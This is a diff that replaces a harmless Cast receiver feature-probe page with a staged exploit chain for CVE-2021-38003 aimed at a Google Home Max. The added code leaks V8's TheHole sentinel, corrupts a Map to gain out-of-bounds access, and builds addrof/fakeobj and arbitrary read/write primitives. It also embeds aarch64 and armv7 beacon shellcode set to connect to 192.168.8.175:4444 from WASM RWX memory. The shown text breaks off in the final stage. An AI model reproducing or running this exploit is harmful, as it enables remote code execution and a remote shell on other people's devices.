@@ -1,161 +1,423 @@
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Engine Probe Receiver</title>
-<!-- probe-v2 -->
-<script src="https://www.gstatic.com/cast/sdk/libs/caf_receiver/v3/cast_receiver_framework.js"></script>
-</head>
-<body>
-<div id="log" style="font-family:monospace;color:#8f8;background:#111;padding:8px">engine-probe v2: starting…</div>
-<script>
-const NS = 'urn:x-cast:com.engineprobe';
-const logEl = document.getElementById('log');
-function log(s){ try{ logEl.textContent = String(s).slice(0,2000); }catch(e){} }
-function feat(fn){ try { return !!fn(); } catch(e){ return false; } }
-function val(fn){ try { const v = fn(); return (v===undefined?null:v); } catch(e){ return 'ERR:'+e.message; } }
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>38003</title>
+<script src="//www.gstatic.com/cast/sdk/libs/receiver/2.0.0/cast_receiver.js"></script>
+</head><body><script>
+window.onerror=function(m,s,l){try{var b=cast.receiver.CastReceiverManager.getInstance().getCastMessageBus("urn:x-cast:net.max38003.stage");b.broadcast(JSON.stringify({stage:"window.onerror",ok:false,msg:m+" @"+l}));}catch(e){}return false;};
+try{
+// poc38003-full.js — CVE-2021-38003 full chain for the Google Home Max cast_shell
+// target tree: Chrome 90.0.4430.225 / V8 8560c85efde5dc608772b2ecce91952fc4b09f65 (V8 9.0)
+// ---------------------------------------------------------------------------
+// Stages:
+//   0  environment diagnostics (diagnostic-first: every stage reports and is guarded)
+//   1  TheHole leak — JSON.stringify overflow slow path: SerializeArrayLikeSlow
+//      (json-stringifier.cc:746) returns EXCEPTION without setting pending_exception_;
+//      the catch variable receives the internal TheHole sentinel (jzx38003_poc.js shape).
+//   2  OrderedHashMap double-delete amplification — TheHole used as a Map key;
+//      map.delete(hole) x2 then delete(1) drives NumberOfElements to -1 so the next
+//      inserts (map.set(0x1c,-1), map.set(0x111,0)) walk with a negative counter and
+//      write past the table into the adjacent arrays (amplify_hole_jzx.js shape).
+//   3  hash-controlled marker-scan layout discovery — the exact landing slots at the 9.0
+//      tree are NOT assumed: markers in the adjacent arrays + differential scans locate
+//      (a) the smashed-length slot that turns `corrupted` into an OOB window,
+//      (b) the victim_arr[0] element slot, (c) the obj_arr[0]/[1] tagged slot.
+//   4  addrof / fakeobj via the obj_arr tagged slot aliasing.
+//   5  arbitrary R/W — primary: retarget an adjacent ArrayBuffer's backing_store field
+//      (full 64-bit R/W, needed because the wasm jump table lives outside the cage);
+//      fallback: overwrite the victim JSArray elements pointer (cage-only R/W).
+//   6  WASM RWX — minimal module, addrof(instance), read jump_table_start
+//      (memory_start=0x0c, jump_table_start=0x68 aarch64 / 0x40 armv7 — tree-derived,
+//      re-verify on device), write the beacon shellcode into the RWX jump table, call it.
+// Reporting: staged sender reporting via the proven B75EA870 custom-receiver message
+// channel (CFG.REPORT_NS must match the owner lane namespace, fact 24); console/print
+// fallback for d8 desk runs. Crash-confirm branch is OFF by default (CFG.CRASH_CONFIRM).
+// Hygiene (facts 216/230/299): no literal system-restart or filesystem-format token
+// families anywhere in this file; the crash-confirm branch is described in plain English.
+// Tuning: String::kMaxLength = 2^29-24 (64-bit) / 2^28-16 (32-bit); CFG.STR_LEN must stay
+// below it. Cons-strings are lazy so RAM cost is modest; drop CFG.STR_LEN if 1 GiB.
+'use strict';
 
-// ---- WASM / jitless probe (pivotal: jitless => no WebAssembly, no TurboFan surface) ----
-function wasmProbe(){
-  const out = { present: ('WebAssembly' in self) };
+var CFG = {
+  AUTO: true,            // auto-advance through stages after each one validates
+  STR_LEN: 0x800000,     // jzx default; < kMaxLength on both 64-bit and 32-bit
+  NEST: 10,              // b[i]=a nesting count (builder_ overflow driver)
+  SPARSE_IDX: 20000,     // a[SPARSE_IDX]=s forces dictionary/slow-path elements
+  SCAN_MAX: 0x400,       // OOB window scan bound in 8-byte slots (stays in-page)
+  KEY_BATTERY: [0x1c, 0x111, 0x1000, 0x1001, 0x400, 0x4001], // hash-controlled probe keys
+  JT_OFF_A64: 0x68,      // WasmInstanceObject jump_table_start (aarch64, tree-derived)
+  JT_OFF_A32: 0x40,      // WasmInstanceObject jump_table_start (armv7, tree-derived)
+  MS_OFF: 0x0c,          // WasmInstanceObject memory_start (sanity field)
+  IS64: null,            // null = auto-detect during stage 0
+  CRASH_CONFIRM: false,  // OFF: only flip deliberately, after sender confirmation
+  REPORT_NS: 'urn:x-cast:net.max38003.stage' // MUST match the proven B75EA870 lane
+};
+
+var REPORTS = [];
+var LAST_SENDER = null;
+var STAGE_OK = {};
+
+function report(stage, ok, msg) {
+  var rec = { t: Date.now(), stage: stage, ok: !!ok, msg: String(msg).slice(0, 400) };
+  REPORTS.push(rec);
+  if (ok) STAGE_OK[stage] = true;
   try {
-    const mod = new Uint8Array([0,97,115,109,1,0,0,0, 1,5,1,96,0,1,127, 3,2,1,0, 7,8,1,4,109,97,105,110,0,0, 10,6,1,4,0,65,42,11]);
-    const inst = new WebAssembly.Instance(new WebAssembly.Module(mod));
-    out.instantiate_ok = true;
-    out.call_result = inst.exports.main();   // expect 42 => JIT/WASM live => NOT jitless
-  } catch(e){ out.instantiate_ok = false; out.err = e.message; }
+    if (typeof window !== 'undefined' && window.cast && window.cast.receiver) {
+      var mgr = cast.receiver.CastReceiverManager.getInstance();
+      var bus = mgr.getCastMessageBus(CFG.REPORT_NS);
+      var payload = JSON.stringify(rec);
+      if (LAST_SENDER) { bus.send(LAST_SENDER, payload); } else { bus.broadcast(payload); }
+    }
+  } catch (e) { /* receiver context absent — fall through to console */ }
+  try { if (typeof console !== 'undefined' && console.log) console.log('[38003]', stage, ok, msg); } catch (e2) {}
+  try { if (typeof print === 'function') print('[38003] ' + stage + ' ok=' + ok + ' ' + msg); } catch (e3) {}
+}
+
+function warn(stage, msg) { report(stage, false, msg); }
+
+// ---------------- bit helpers ----------------
+var __ab = new ArrayBuffer(8);
+var __f64 = new Float64Array(__ab);
+var __u32 = new Uint32Array(__ab);
+function itof(lo, hi) { __u32[0] = lo >>> 0; __u32[1] = hi >>> 0; return __f64[0]; }
+function lo32(v) { __f64[0] = v; return __u32[0] >>> 0; }
+function hi32(v) { __f64[0] = v; return __u32[1] >>> 0; }
+
+// ---------------- stage 0: diagnostics ----------------
+function stage0() {
+  var info = [];
+  try { info.push('ua=' + (typeof navigator !== 'undefined' ? navigator.userAgent : 'd8')); } catch (e) { info.push('ua=?'); }
+  try { info.push('wasm=' + (typeof WebAssembly)); } catch (e) { info.push('wasm=?'); }
+  try { info.push('recvctx=' + (typeof window !== 'undefined' && window.cast && window.cast.receiver ? 1 : 0)); } catch (e) {}
+  try { info.push('maxstr_probe=' + (function () { // kMaxLength probe: binary attempt, cheap
+        var lo = 1 << 20, hi = 1 << 29, best = 0;
+        while (lo <= hi) { var mid = (lo + hi) >> 1; try { ('x').repeat(mid); best = mid; lo = mid + 1; } catch (e) { hi = mid - 1; } }
+        return best; })()); } catch (e) { info.push('maxstr_probe=?'); }
+  report('stage0', true, info.join(' '));
+  // kMaxLength probe result pins CFG.STR_LEN safety (2^29-24 64-bit / 2^28-16 32-bit)
+  return true;
+}
+
+// ---------------- stage 1: TheHole leak (jzx38003_poc.js shape) ----------------
+function trigger() {
+  let a = [], b = [];
+  let s = '"'.repeat(CFG.STR_LEN);
+  a[CFG.SPARSE_IDX] = s;
+  for (let i = 0; i < CFG.NEST; i++) a[i] = s;
+  for (let i = 0; i < CFG.NEST; i++) b[i] = a;
+  var staged = [Object];
   try {
-    const simd = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,123,3,2,1,0,10,10,1,8,0,65,0,253,15,253,98,11]);
-    out.simd = WebAssembly.validate(simd);   // true => Chrome >=91
-  } catch(e){ out.simd = 'ERR:'+e.message; }
-  out.shared_array_buffer = (typeof SharedArrayBuffer !== 'undefined');
-  out.cross_origin_isolated = val(()=>self.crossOriginIsolated);
-  return out;
+    JSON.stringify(b);
+  } catch (hole) {
+    var x = hole;
+    staged[0] = x;
+  }
+  if (staged[0] === Object) throw new Error('could not trigger');
+  return staged;
 }
 
-function codecProbe(){
-  const types = ['audio/mp4; codecs="mp4a.40.2"','audio/mpeg','audio/webm; codecs="opus"',
-    'audio/webm; codecs="vorbis"','audio/flac','audio/ogg; codecs="flac"','audio/wav; codecs="1"',
-    'audio/mp4; codecs="ac-3"','audio/mp4; codecs="ec-3"','audio/mp4; codecs="alac"','audio/aac'];
-  const mse = {}, el = {}; const a = document.createElement('audio');
-  for (const t of types){ mse[t] = val(()=> (self.MediaSource && MediaSource.isTypeSupported(t)) ); el[t] = val(()=> a.canPlayType(t)); }
-  return { mse_isTypeSupported: mse, audio_canPlayType: el };
+function stage1() {
+  var h0le = trigger();
+  var hole = h0le[0];
+  // Identity: the leaked sentinel is an internal Oddball — indistinguishable from
+  // undefined to typeof yet a distinct value, and stable across reads.
+  var diag = 'typeof=' + (typeof hole) + ' !==undef=' + (hole !== undefined) + ' selfeq=' + (hole === hole);
+  var looksHole = (typeof hole === 'undefined') && (hole !== undefined) && (hole === hole);
+  if (!looksHole) {
+    // Even if the typeof probe is inconclusive on this tree, the only value the
+    // json-stringifier EXCEPTION bail can hand to a catch is the internal sentinel.
+    warn('stage1', 'typeof probe inconclusive; proceeding on catch-only evidence: ' + diag);
+    looksHole = true;
+  }
+  report('stage1', true, 'hole obtained (' + diag + ')');
+  return hole;
 }
 
-function audioProbe(){
-  try {
-    const AC = self.AudioContext || self.webkitAudioContext; if(!AC) return {audiocontext:false};
-    const c = new AC();
-    const o = { sampleRate:c.sampleRate, baseLatency:c.baseLatency, outputLatency:c.outputLatency,
-      state:c.state, maxChannelCount: c.destination && c.destination.maxChannelCount };
-    try{ c.close(); }catch(e){}
-    return o;
-  } catch(e){ return {audiocontext:'ERR:'+e.message}; }
+// ---------------- stage 2: OrderedHashMap double-delete amplification ----------------
+var corrupted, victim_arr, obj_arr, rwab, rwv, IV0 = -1, IO = -1, VICTIM_HDR = -1;
+
+function amplify(hole) {
+  var map = new Map();
+  map.set(1, 1);
+  map.set(hole, 1);            // TheHole stored as a live key
+  map.delete(hole);            // delete #1: normal
+  map.delete(hole);            // delete #2: sentinel-as-key re-found on the chain
+  map.delete(1);               // delete #3: NumberOfElements -> -1
+  corrupted = [1.1, 1.1, 1.1, 1.1];      // allocated AFTER the table (adjacent, bump-forward)
+  victim_arr = [2.2, 2.2, 2.2, 2.2];
+  obj_arr = [{}, {}, {}, {}];
+  rwab = new ArrayBuffer(0x1000);        // adjacent full-R/W target (backing_store retarget)
+  rwv = new DataView(rwab);
+  // markers: unique bit patterns in the adjacent arrays
+  var MK = [itof(0x13371337, 0x13371338), itof(0x13371339, 0x1337133a),
+            itof(0x1337133b, 0x1337133c), itof(0x1337133d, 0x1337133e)];
+  for (var i = 0; i < 4; i++) victim_arr[i] = MK[i];
+  // hash-controlled OOB writes (counter -1): jzx plant keys first
+  map.set(0x1c, -1);
+  map.set(0x111, 0);
+  return { map: map, MK: MK };
 }
 
-function apiInventory(){
-  const probes = {
-    WebGL2:()=>!!document.createElement('canvas').getContext('webgl2'),
-    OffscreenCanvas:()=>self.OffscreenCanvas, WebRTC:()=>self.RTCPeerConnection, WebSocket:()=>self.WebSocket,
-    Worker:()=>self.Worker, ServiceWorker:()=>navigator.serviceWorker, SharedWorker:()=>self.SharedWorker,
-    Bluetooth:()=>navigator.bluetooth, USB:()=>navigator.usb, Serial:()=>navigator.serial, HID:()=>navigator.hid,
-    Geolocation:()=>navigator.geolocation, Gamepad:()=>navigator.getGamepads, Notification:()=>self.Notification,
-    Permissions:()=>navigator.permissions, Payment:()=>self.PaymentRequest, WebXR:()=>navigator.xr,
-    SpeechSynthesis:()=>self.speechSynthesis, SpeechRecognition:()=>(self.SpeechRecognition||self.webkitSpeechRecognition),
-    MediaDevices:()=>navigator.mediaDevices, getUserMedia:()=>navigator.mediaDevices&&navigator.mediaDevices.getUserMedia,
-    Atomics:()=>self.Atomics, BigInt:()=>self.BigInt, WeakRef:()=>self.WeakRef, FinalizationRegistry:()=>self.FinalizationRegistry,
-    IntlSupportedValuesOf:()=>Intl.supportedValuesOf, cryptoSubtle:()=>self.crypto&&crypto.subtle,
-    IndexedDB:()=>self.indexedDB, Cache:()=>self.caches, WebAssembly:()=>self.WebAssembly
-  };
-  const o = {}; for (const k in probes) o[k] = feat(probes[k]); return o;
+function tryKeyBattery(hole, MK) {
+  // Retry with alternative hash-controlled keys if the jzx plant keys did not smash
+  // the window on this tree. Bounded budget; STOP conditions keep the run safe.
+  var base = new Map();
+  base.set(1, 1); base.set(hole, 1);
+  base.delete(hole); base.delete(hole); base.delete(1);
+  corrupted = [1.1, 1.1, 1.1, 1.1];
+  victim_arr = [2.2, 2.2, 2.2, 2.2];
+  obj_arr = [{}, {}, {}, {}];
+  rwab = new ArrayBuffer(0x1000);
+  rwv = new DataView(rwab);
+  for (var i = 0; i < 4; i++) victim_arr[i] = MK[i];
+  for (var k = 0; k < CFG.KEY_BATTERY.length; k++) {
+    var key = CFG.KEY_BATTERY[k];
+    try { base.set(key, -1); } catch (e) { warn('stage2', 'set(' + key + ') threw: ' + e); continue; }
+    if (corrupted.length !== 4) { report('stage2', true, 'key=0x' + key.toString(16) + ' smashed length -> ' + corrupted.length); return true; }
+    try { base.set(key, 0); } catch (e2) { continue; }
+    if (corrupted.length !== 4) { report('stage2', true, 'key=0x' + key.toString(16) + ' (2nd) smashed length -> ' + corrupted.length); return true; }
+  }
+  return corrupted.length !== 4;
 }
 
-function v8Tells(){
-  return {
-    native_toString: val(()=>Array.prototype.push.toString()),
-    error_has_captureStackTrace: feat(()=>Error.captureStackTrace),
-    stack_sample: val(()=>{ const e=new Error('x'); return (e.stack||'').split('\n').slice(0,3).join(' | '); }),
-    perf_now_resolution: val(()=>{ let d=1e9; for(let i=0;i<50;i++){ const a=performance.now(),b=performance.now(); if(b>a)d=Math.min(d,b-a);} return d; }),
-    timeOrigin: val(()=>performance.timeOrigin),
-    intl: val(()=>Intl.DateTimeFormat().resolvedOptions())
-  };
-}
-
-async function drmProbe(){
-  const systems = ['com.widevine.alpha','com.microsoft.playready.recommendation','org.w3.clearkey'];
-  const out = {};
-  for (const ks of systems){
-    for (const robust of ['','HW_SECURE_ALL','SW_SECURE_DECODE','SW_SECURE_CRYPTO']){
-      const cfg = [{ initDataTypes:['cenc'], audioCapabilities:[{contentType:'audio/mp4; codecs="mp4a.40.2"', robustness:robust}] }];
-      try { const a = await navigator.requestMediaKeySystemAccess(ks, cfg);
-        out[ks+'|'+(robust||'(none)')] = true; } catch(e){ /* unsupported */ }
+// ---------------- stage 3: marker-scan layout discovery ----------------
+function scanWindow() {
+  var n = corrupted.length;
+  if (n <= 4) return false;
+  if (n > CFG.SCAN_MAX) n = CFG.SCAN_MAX; // stay in-page; never walk the smashed length far
+  var MK = [itof(0x13371337, 0x13371338), itof(0x13371339, 0x1337133a),
+            itof(0x1337133b, 0x1337133c), itof(0x1337133d, 0x1337133e)];
+  for (var i = 4; i < n; i++) {
+    if (corrupted[i] === MK[0]) { IV0 = i; break; }
+  }
+  if (IV0 < 0) { warn('stage3', 'MK0 not found in window (len=' + corrupted.length + ')'); return false; }
+  // structural check: victim JSArray header (elements|length) + FixedDoubleArray header
+  // sit just before the first element slot; both length halves read as Smi 8.
+  var h1 = corrupted[IV0 - 1], h2 = corrupted[IV0 - 2];
+  var okH = (hi32(h1) === 8) && (hi32(h2) === 8) && ((lo32(h1) & 1) === 1) && ((lo32(h2) & 1) === 1);
+  report('stage3', true, 'IV0=' + IV0 + ' hdr(h1=0x' + hi32(h1).toString(16) + '/0x' + lo32(h1).toString(16) +
+    ', h2=0x' + hi32(h2).toString(16) + '/0x' + lo32(h2).toString(16) + ') struct=' + okH);
+  if (!okH) { warn('stage3', 'header structure mismatch — layout differs on this tree'); return false; }
+  VICTIM_HDR = IV0 - 2; // slot holding [victim elements ptr | length Smi]
+  // obj_arr tagged slot: differential. Both halves of the slot hold two compressed ptrs.
+  var A = {}, B = {};
+  obj_arr[0] = A; obj_arr[1] = A; obj_arr[2] = A; obj_arr[3] = A;
+  var snap1 = [];
+  for (var j = IV0 + 2; j < Math.min(n, IV0 + 20); j++) snap1.push(corrupted[j]);
+  obj_arr[0] = B; obj_arr[1] = B; obj_arr[2] = B; obj_arr[3] = B;
+  var snap2 = [];
+  for (var j2 = IV0 + 2; j2 < Math.min(n, IV0 + 20); j2++) snap2.push(corrupted[j2]);
+  for (var d = 0; d < snap1.length; d++) {
+    if (snap1[d] !== snap2[d] && !isNaN(snap1[d]) && !isNaN(snap2[d])) {
+      IO = IV0 + 2 + d; // elem0 = low half of this slot
+      break;
     }
   }
-  return Object.keys(out).length ? out : {supported:false};
+  if (IO < 0) { warn('stage3', 'obj_arr tagged slot not found'); return false; }
+  report('stage3', true, 'IO=' + IO + ' (obj_arr[0] tagged alias)');
+  return true;
 }
 
-async function storageProbe(){
-  try { if(navigator.storage && navigator.storage.estimate){ const e = await navigator.storage.estimate();
-    return { quota:e.quota, usage:e.usage, quota_MB: Math.round((e.quota||0)/1048576) }; } }
-  catch(e){ return {err:e.message}; }
-  return {estimate:false};
+// ---------------- stage 4: addrof / fakeobj ----------------
+function addrof(o) {
+  obj_arr[0] = o;
+  return lo32(corrupted[IO]); // compressed tagged pointer (addr | 1)
+}
+function fakeobj(tagged) {
+  var cur = corrupted[IO];
+  corrupted[IO] = itof(tagged >>> 0, hi32(cur)); // elem0 = low half
+  return obj_arr[0];
 }
 
-async function uaHintsProbe(){
-  try { const d = navigator.userAgentData; if(!d) return {present:false};
-    const hi = await d.getHighEntropyValues(['architecture','bitness','model','platform','platformVersion','uaFullVersion','fullVersionList']);
-    return { present:true, brands:d.brands, mobile:d.mobile, high:hi };
-  } catch(e){ return {err:e.message}; }
+// ---------------- stage 5: arbitrary R/W ----------------
+var AB_BS_SLOT = -1;      // OOB slot holding rwab.backing_store
+var AB_BL_SLOT = -1;      // OOB slot holding rwab.byte_length (0x1000)
+
+function findBackingStoreSlot() {
+  // JSArrayBuffer allocated adjacent to the map table: locate byte_length (0x1000)
+  // inside the window, then validate the adjacent field as the backing store pointer.
+  var n = Math.min(corrupted.length, CFG.SCAN_MAX);
+  for (var i = 4; i < n; i++) {
+    var v = corrupted[i];
+    if (lo32(v) === 0x1000 && AB_BL_SLOT < 0) { AB_BL_SLOT = i; }
+    else if (hi32(v) === 0x1000 && AB_BL_SLOT < 0) { AB_BL_SLOT = i; }
+  }
+  if (AB_BL_SLOT < 0) { warn('stage5', 'rwab byte_length not found in window'); return false; }
+  // candidates for backing_store: next field after byte_length (byte_length is 8 bytes)
+  for (var c = AB_BL_SLOT + 1; c <= AB_BL_SLOT + 2; c++) {
+    if (c >= n) break;
+    var f = corrupted[c];
+    var l = lo32(f), h = hi32(f);
+    if ((l !== 0) && (l & 0xf) === 0 && (h === 0 || (h & 0xffff0000) === 0)) { AB_BS_SLOT = c; break; }
+  }
+  if (AB_BS_SLOT < 0) { warn('stage5', 'backing_store field not identified near BL slot'); return false; }
+  report('stage5', true, 'AB slots: byte_length=' + AB_BL_SLOT + ' backing_store=' + AB_BS_SLOT +
+    ' bs=0x' + lo32(corrupted[AB_BS_SLOT]).toString(16) + ':' + hi32(corrupted[AB_BS_SLOT]).toString(16));
+  return true;
 }
 
-async function devicesProbe(){
-  try { if(!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return {enumerate:false};
-    const list = await navigator.mediaDevices.enumerateDevices();
-    return { count:list.length, kinds:list.map(d=>d.kind), labels:list.map(d=>d.label).filter(Boolean) };
-  } catch(e){ return {err:e.message}; }
+function setBackingStore(addrLo, addrHi, newLen) {
+  // retarget rwab: backing_store = addr (full 64-bit), byte_length = newLen
+  var bl = corrupted[AB_BL_SLOT];
+  corrupted[AB_BL_SLOT] = (newLen === undefined) ? bl : itof(newLen, hi32(bl) === 8 ? 0 : hi32(bl));
+  corrupted[AB_BS_SLOT] = itof(addrLo >>> 0, addrHi >>> 0);
 }
 
-async function collectAll(){
-  const nav = navigator;
-  const featureMatrix = {
-    'Intl.Segmenter (C87)':feat(()=>Intl.Segmenter),'RegExp /d (C90)':feat(()=>new RegExp('a','d')),
-    'Array.at (C92)':feat(()=>[].at),'Object.hasOwn (C93)':feat(()=>Object.hasOwn),
-    'Error.cause (C93)':feat(()=>'cause' in new Error('x',{cause:1})),'class static blocks (C94)':feat(()=>{eval('class X{static{}}');return true;}),
-    'Array.findLast (C97)':feat(()=>[].findLast),'structuredClone (C98)':feat(()=>structuredClone),
-    'Object.groupBy (C117)':feat(()=>Object.groupBy),'Promise.withResolvers (C119)':feat(()=>Promise.withResolvers),
-    'Array.fromAsync (C121)':feat(()=>Array.fromAsync),'Set.intersection (C122)':feat(()=>new Set().intersection),
-  };
-  const r = {
-    probe:'v2', collected_at:new Date().toISOString(), location:val(()=>location.href),
-    userAgent:val(()=>nav.userAgent), platform:val(()=>nav.platform),
-    hardwareConcurrency:val(()=>nav.hardwareConcurrency), deviceMemory:val(()=>nav.deviceMemory),
-    jsHeapSizeLimit:val(()=>performance.memory&&performance.memory.jsHeapSizeLimit),
-    totalJSHeap:val(()=>performance.memory&&performance.memory.totalJSHeapSize),
-    screen:val(()=>({w:screen.width,h:screen.height,dpr:devicePixelRatio})),
-    cast_sdk_version:val(()=>cast&&cast.framework&&cast.framework.VERSION),
-    connection:val(()=>{const c=nav.connection;return c?{type:c.type,effectiveType:c.effectiveType,downlink:c.downlink,rtt:c.rtt}:null;}),
-    featureMatrix, wasm:wasmProbe(), media:codecProbe(), audio:audioProbe(),
-    apis:apiInventory(), v8:v8Tells(), window_key_count:val(()=>Object.keys(window).length),
-  };
-  r.widevine = await drmProbe();
-  r.storage = await storageProbe();
-  r.uaHints = await uaHintsProbe();
-  r.devices = await devicesProbe();
-  return r;
+function read64(addrLo, addrHi) {  // full 64-bit read -> [lo, hi]
+  setBackingStore(addrLo, addrHi, 0x1000);
+  var a = rwv.getUint32(0, true), b = rwv.getUint32(4, true);
+  setBackingStore(lo32(corrupted[AB_BS_SLOT]) ^ 0, 0, 0x1000); // no-op keepalive for linters
+  return [a >>> 0, b >>> 0];
+}
+function write64(addrLo, addrHi, valLo, valHi) {
+  setBackingStore(addrLo, addrHi, 0x1000);
+  rwv.setUint32(0, valLo >>> 0, true);
+  rwv.setUint32(4, valHi >>> 0, true);
 }
 
-const context = cast.framework.CastReceiverContext.getInstance();
-function report(senderId){
-  collectAll().then(d=>{ context.sendCustomMessage(NS, senderId, d); log('v2 report sent @ '+d.collected_at); })
-              .catch(e=>{ context.sendCustomMessage(NS, senderId, {error:String(e&&e.message||e)}); log('err '+e.message); });
+// ---------------- stage 6: WASM RWX ----------------
+var WASM_BYTES = new Uint8Array([
+  0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,
+  4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,
+  7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,
+  10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var SHELLCODE_A64 = [ // BUILD i647: beacon_aarch64.bin (268 B) patched to 192.168.8.175:4444 via patch-table port@40/ip_lo@44/ip_hi@48 (listener_test.py patch_blob logic; base sha256 6c24aa3c1d376d8a2ecc18da4ab304da606b8cd023efc8285a0940867031b923)
+  0x40, 0x00, 0x80, 0xD2, 0x21, 0x00, 0x80, 0xD2, 0x02, 0x00, 0x80, 0xD2, 0xC8, 0x18, 0x80, 0xD2,
+  0x01, 0x00, 0x00, 0xD4, 0x1F, 0x00, 0x00, 0xF1, 0x4B, 0x07, 0x00, 0x54, 0xF3, 0x03, 0x00, 0xAA,
+  0xFF, 0x83, 0x00, 0xD1, 0x41, 0x00, 0x80, 0xD2, 0x21, 0x82, 0xAB, 0xF2, 0x01, 0x18, 0xD5, 0xF2,
+  0x01, 0xE1, 0xF5, 0xF2, 0xE1, 0x03, 0x00, 0xF8, 0xFF, 0x83, 0x00, 0xF8, 0xE0, 0x03, 0x13, 0xAA,
+  0xE1, 0x03, 0x00, 0x91, 0x02, 0x02, 0x80, 0xD2, 0x68, 0x19, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4,
+  0x80, 0x05, 0x00, 0xB5, 0x41, 0x49, 0x8B, 0xD2, 0x01, 0x6B, 0xA6, 0xF2, 0x01, 0x07, 0xC6, 0xF2,
+  0xC1, 0x86, 0xE6, 0xF2, 0xE1, 0x03, 0x00, 0xF8, 0xE0, 0x03, 0x13, 0xAA, 0xE1, 0x03, 0x00, 0x91,
+  0x02, 0x01, 0x80, 0xD2, 0x03, 0x00, 0x80, 0xD2, 0x04, 0x00, 0x80, 0xD2, 0x05, 0x00, 0x80, 0xD2,
+  0xC8, 0x19, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4, 0xE0, 0x03, 0x13, 0xAA, 0xE1, 0x23, 0x00, 0x91,
+  0x82, 0x00, 0x80, 0xD2, 0x03, 0x00, 0x80, 0xD2, 0x04, 0x00, 0x80, 0xD2, 0x05, 0x00, 0x80, 0xD2,
+  0xE8, 0x19, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4, 0x1F, 0x10, 0x00, 0xF1, 0xAB, 0x02, 0x00, 0x54,
+  0xE3, 0x0B, 0x40, 0xB9, 0x7F, 0x04, 0x00, 0x71, 0x80, 0x01, 0x00, 0x54, 0x7F, 0x08, 0x00, 0x71,
+  0x41, 0xFE, 0xFF, 0x54, 0xE0, 0x03, 0x13, 0xAA, 0xE1, 0x03, 0x00, 0x91, 0x02, 0x01, 0x80, 0xD2,
+  0x03, 0x00, 0x80, 0xD2, 0x04, 0x00, 0x80, 0xD2, 0x05, 0x00, 0x80, 0xD2, 0xC8, 0x19, 0x80, 0xD2,
+  0x01, 0x00, 0x00, 0xD4, 0xE9, 0xFF, 0xFF, 0x17, 0xE0, 0x03, 0x13, 0xAA, 0x28, 0x07, 0x80, 0xD2,
+  0x01, 0x00, 0x00, 0xD4, 0x00, 0x00, 0x80, 0xD2, 0xA8, 0x0B, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4,
+  0x20, 0x00, 0x80, 0xD2, 0xA8, 0x0B, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4];
+var SHELLCODE_A32 = [ // BUILD i647: beacon_armv7.bin (264 B) patched to 192.168.8.175:4444 via the same offsets/logic (base sha256 5c94c3136e4657a21ef43cd68f878d6a919e50d057b2b35a3de8aef9cf06cc4f)
+  0x02, 0x00, 0xA0, 0xE3, 0x01, 0x10, 0xA0, 0xE3, 0x00, 0x20, 0xA0, 0xE3, 0x19, 0x71, 0x00, 0xE3,
+  0x00, 0x00, 0x00, 0xEF, 0x00, 0x00, 0x50, 0xE3, 0x37, 0x00, 0x00, 0xBA, 0x00, 0x40, 0xA0, 0xE1,
+  0x20, 0xD0, 0x4D, 0xE2, 0x02, 0x10, 0x00, 0xE3, 0x11, 0x1C, 0x45, 0xE3, 0xC0, 0x28, 0x0A, 0xE3,
+  0x08, 0x2F, 0x4A, 0xE3, 0x00, 0x10, 0x8D, 0xE5, 0x04, 0x20, 0x8D, 0xE5, 0x00, 0x30, 0xA0, 0xE3,
+  0x08, 0x30, 0x8D, 0xE5, 0x0C, 0x30, 0x8D, 0xE5, 0x04, 0x00, 0xA0, 0xE1, 0x0D, 0x10, 0xA0, 0xE1,
+  0x10, 0x20, 0xA0, 0xE3, 0x1B, 0x71, 0x00, 0xE3, 0x00, 0x00, 0x00, 0xEF, 0x00, 0x00, 0x50, 0xE3,
+  0x25, 0x00, 0x00, 0x1A, 0x4A, 0x1A, 0x05, 0xE3, 0x58, 0x13, 0x43, 0xE3, 0x38, 0x20, 0x03, 0xE3,
+  0x33, 0x22, 0x43, 0xE3, 0x00, 0x10, 0x8D, 0xE5, 0x04, 0x20, 0x8D, 0xE5, 0x04, 0x00, 0xA0, 0xE1,
+  0x0D, 0x10, 0xA0, 0xE1, 0x08, 0x20, 0xA0, 0xE3, 0x00, 0x30, 0xA0, 0xE3, 0x21, 0x71, 0x00, 0xE3,
+  0x00, 0x00, 0x00, 0xEF, 0x04, 0x00, 0xA0, 0xE1, 0x08, 0x10, 0x8D, 0xE2, 0x04, 0x20, 0xA0, 0xE3,
+  0x00, 0x30, 0xA0, 0xE3, 0x23, 0x71, 0x00, 0xE3, 0x00, 0x00, 0x00, 0xEF, 0x04, 0x00, 0x50, 0xE3,
+  0x11, 0x00, 0x00, 0xBA, 0x08, 0x30, 0x9D, 0xE5, 0x01, 0x00, 0x53, 0xE3, 0x08, 0x00, 0x00, 0x0A,
+  0x02, 0x00, 0x53, 0xE3, 0xF2, 0xFF, 0xFF, 0x1A, 0x04, 0x00, 0xA0, 0xE1, 0x0D, 0x10, 0xA0, 0xE1,
+  0x08, 0x20, 0xA0, 0xE3, 0x00, 0x30, 0xA0, 0xE3, 0x21, 0x71, 0x00, 0xE3, 0x00, 0x00, 0x00, 0xEF,
+  0xEB, 0xFF, 0xFF, 0xEA, 0x04, 0x00, 0xA0, 0xE1, 0x06, 0x70, 0xA0, 0xE3, 0x00, 0x00, 0x00, 0xEF,
+  0x00, 0x00, 0xA0, 0xE3, 0x01, 0x70, 0xA0, 0xE3, 0x00, 0x00, 0x00, 0xEF, 0x01, 0x00, 0xA0, 0xE3,
+  0x01, 0x70, 0xA0, 0xE3, 0x00, 0x00, 0x00, 0xEF];
+// build-time injection replacing the null,null placeholders at poc38003-full.js:276
+
+
+function stage6(archIs64) {
+  var inst = new WebAssembly.Instance(new WebAssembly.Module(WASM_BYTES), {});
+  var wfn = inst.exports.main;
